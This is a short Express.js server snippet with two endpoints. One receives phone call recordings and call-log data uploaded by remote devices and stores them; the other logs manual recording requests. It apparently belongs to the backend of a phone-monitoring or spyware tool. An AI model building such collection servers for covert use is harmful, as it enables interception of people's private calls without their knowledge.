// Call Recording Receive
app.post('/api/call-recording', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, callNumber, callTime, duration, audioBase64, fileName, fileSize } = req.body;
    const devices = getDevices();

    if (devices[deviceId]) {
        if (!devices[deviceId].callRecordings) devices[deviceId].callRecordings = [];
        devices[deviceId].callRecordings.push({
            number: callNumber,
            time: callTime,
            duration: duration,
            audioBase64: audioBase64,
            fileName: fileName,
            fileSize: fileSize,
            receivedAt: Date.now()
        });

        // Call logs mein bhi recording link add karein
        if (devices[deviceId].callLogs) {
            devices[deviceId].callLogs.forEach(call => {
                if (Math.abs(call.date - callTime) < 5000 && call.number === callNumber) {
                    call.recording = `data:audio/mp4;base64,${audioBase64}`;
                    call.audioUrl = `data:audio/mp4;base64,${audioBase64}`;
                }
            });
        }

        saveDevices(devices);
        console.log(`Call recording received from ${deviceId}: ${fileName} (${fileSize} bytes)`);
    }
    res.json({ success: true });
});

// Manual call record start
app.post('/api/call-record-start', (req, res) => {
    const { deviceId, message } = req.body;
    console.log(`Manual record request from ${deviceId}: ${message}`);
    res.json({ success: true });
});
